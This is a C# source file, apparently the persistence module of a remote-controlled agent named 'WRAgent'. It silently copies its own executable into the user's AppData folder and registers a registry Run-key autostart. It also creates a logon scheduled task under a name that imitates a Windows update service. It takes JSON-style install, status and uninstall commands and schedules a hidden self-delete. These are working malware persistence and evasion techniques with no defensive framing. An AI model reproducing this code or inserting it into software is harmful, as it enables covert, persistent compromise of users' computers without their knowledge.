using System.Diagnostics;
using System.Text.Json.Nodes;
using Microsoft.Win32;

namespace WRAgent
{
    internal static class PersistModule
    {
        private const string RunKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string TaskName = @"Microsoft\Windows\UpdateService";

        public static string TargetDir => Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", BuildInfo.AgentTag);

        public static string TargetExe => Path.Combine(TargetDir, BuildInfo.AgentTag + ".exe");

        private static string SelfPath
        {
            get
            {
                try
                {
                    var p = Environment.ProcessPath;
                    if (!string.IsNullOrEmpty(p)) return p;
                }
                catch { }
                return Process.GetCurrentProcess().MainModule?.FileName ?? "";
            }
        }

        // ------------------------------------------------------------------
        /// <summary>Copy into %APPDATA% and register autostart. Best effort, silent.</summary>
        public static void Ensure()
        {
            try
            {
                var self = SelfPath;
                if (string.IsNullOrEmpty(self)) return;

                if (!string.Equals(self, TargetExe, StringComparison.OrdinalIgnoreCase))
                {
                    Directory.CreateDirectory(TargetDir);
                    if (!File.Exists(TargetExe))
                    {
                        try { File.Copy(self, TargetExe, true); }
                        catch (Exception e) { Log.W("install copy: " + e.Message); }
                    }
                }

                InstallRunKey();
            }
            catch (Exception e)
            {
                Log.W("ensure: " + e.Message);
            }
        }

        private static void InstallRunKey()
        {
            try
            {
                var target = File.Exists(TargetExe) ? TargetExe : SelfPath;
                if (string.IsNullOrEmpty(target)) return;

                using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
                if (key is null) return;

                var current = key.GetValue(BuildInfo.AgentTag)?.ToString();
                var want = "\"" + target + "\"";
                if (!string.Equals(current, want, StringComparison.OrdinalIgnoreCase))
                    key.SetValue(BuildInfo.AgentTag, want, RegistryValueKind.String);
            }
            catch (Exception e)
            {
                Log.W("install runkey: " + e.Message);
            }
        }

        // ------------------------------------------------------------------
        public static JsonObject Run(JsonObject args)
        {
            var action = Util.Str(args, "action", "install").ToLowerInvariant();
            switch (action)
            {
                case "status":
                    return new JsonObject
                    {
                        ["ok"] = true,
                        ["stdout"] =
                            $"self     {SelfPath}\n" +
                            $"target   {TargetExe}\n" +
                            $"copied   {File.Exists(TargetExe)}\n" +
                            $"runkey   {RunKeyValue() ?? "-"}\n" +
                            $"task     {TaskExists()}"
                    };

                case "install":
                    return Install();

                case "uninstall":
                    return Uninstall();

                default:
                    return new JsonObject { ["ok"] = false, ["error"] = "unknown action" };
            }
        }

        private static JsonObject Install()
        {
            var log = new List<string>();
            try
            {
                Directory.CreateDirectory(TargetDir);
                if (!string.Equals(SelfPath, TargetExe, StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        File.Copy(SelfPath, TargetExe, true);
                        log.Add("copied -> " + TargetExe);
                    }
                    catch (Exception e) { log.Add("copy failed: " + e.Message); }
                }
                else log.Add("already resident");

                InstallRunKey();
                log.Add("run key set");

                // logon task, needs elevation for /RL HIGHEST — ignore failure
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Create /TN \"{TaskName}\" /TR \"\\\"{TargetExe}\\\"\" " +
                                "/SC ONLOGON /RL LIMITED /F",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using var p = Process.Start(psi);
                p?.WaitForExit(8000);
                var outText = (p?.StandardOutput.ReadToEnd() ?? "").Trim();
                if (p != null && p.ExitCode == 0) log.Add("scheduled task created");
                else log.Add("task skipped: " + (outText.Length > 0 ? outText : "no elevation"));

                return new JsonObject { ["ok"] = true, ["stdout"] = string.Join("\n", log) };
            }
            catch (Exception e)
            {
                log.Add("error: " + e.Message);
                return new JsonObject { ["ok"] = false, ["error"] = string.Join("\n", log) };
            }
        }

        private static JsonObject Uninstall()
        {
            var log = new List<string>();
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true))
                {
                    if (key?.GetValue(BuildInfo.AgentTag) != null)
                    {
                        key.DeleteValue(BuildInfo.AgentTag, throwOnMissingValue: false);
                        log.Add("run key removed");
                    }
                }

                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Delete /TN \"{TaskName}\" /F",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                try { using var p = Process.Start(psi); p?.WaitForExit(6000); } catch { }

                // self-delete after exit
                var target = TargetExe;
                if (File.Exists(target))
                {
                    var cmd = $"/c timeout /t 3 >nul & del /f /q \"{target}\" & rmdir \"{TargetDir}\" 2>nul";
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = cmd,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        });
                        log.Add("self-delete scheduled");
                    }
                    catch (Exception e) { log.Add("self-delete failed: " + e.Message); }
                }

                return new JsonObject { ["ok"] = true, ["stdout"] = string.Join("\n", log) };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        private static string RunKeyValue()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(RunKey);
                return key?.GetValue(BuildInfo.AgentTag)?.ToString();
            }
            catch { return null; }
        }

        private static bool TaskExists()
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Query /TN \"{TaskName}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using var p = Process.Start(psi);
                p?.WaitForExit(6000);
                return p != null && p.ExitCode == 0;
            }
            catch { return false; }
        }
    }
}
